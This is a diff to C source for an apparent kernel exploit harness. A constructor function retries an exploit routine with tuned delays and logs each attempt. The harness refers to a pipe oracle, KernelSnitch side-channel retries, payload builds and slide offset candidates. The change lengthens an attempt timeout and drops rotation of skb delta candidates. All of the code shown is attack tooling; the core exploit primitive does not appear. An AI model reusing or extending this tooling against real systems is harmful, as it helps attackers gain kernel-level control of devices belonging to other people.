@@ -7,7 +7,8 @@
 #endif
 #define DEFAULT_PSELECT_DELAY_USEC 20000
 #define DEFAULT_ATTEMPT_TIMEOUT_SEC 90
-#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 20
+/* Pipe oracle + many mm KernelSnitch retries need >>20s or the child is SIGKILL'd. */
+#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 90
 #define APP_MIN_BOOT_UPTIME_SEC 120
 
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
@@ -140,30 +141,19 @@ __attribute__((constructor)) static void load(void) {
       char delay[16];
       snprintf(delay, sizeof(delay), "%d", delay_usec);
       SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
-#if defined(SKB_DELTA_CANDIDATES)
-      /*
-       * Rotate skb linear delta candidates across independent attempts so a
-       * Flip6-class headroom mismatch can be found without reflashing.
-       */
-      char delta_idx[16];
-      snprintf(delta_idx, sizeof(delta_idx), "%d", attempt - 1);
-      SYSCHK(setenv("SKB_DELTA_INDEX", delta_idx, 1));
-#endif
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
       const char *forced_offset = getenv("SLIDE_P0_OFFSET");
       if (forced_offset) {
-        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s "
-                   "skb_delta_index=%d\n",
+        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=%s\n",
                    attempt, max_attempts, getpid(), delay_usec,
-                   forced_offset, attempt - 1);
+                   forced_offset);
       } else {
-        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=scan "
-                   "skb_delta_index=%d\n",
-                   attempt, max_attempts, getpid(), delay_usec, attempt - 1);
+        pr_success("exploit attempt=%d/%d pid=%d delay=%d p0_offset=scan\n",
+                   attempt, max_attempts, getpid(), delay_usec);
       }
 #else
-      pr_success("exploit attempt=%d/%d pid=%d delay=%d skb_delta_index=%d\n",
-                 attempt, max_attempts, getpid(), delay_usec, attempt - 1);
+      pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
+                 attempt, max_attempts, getpid(), delay_usec);
 #endif
       _exit(run_exploit(1, argv));
     }
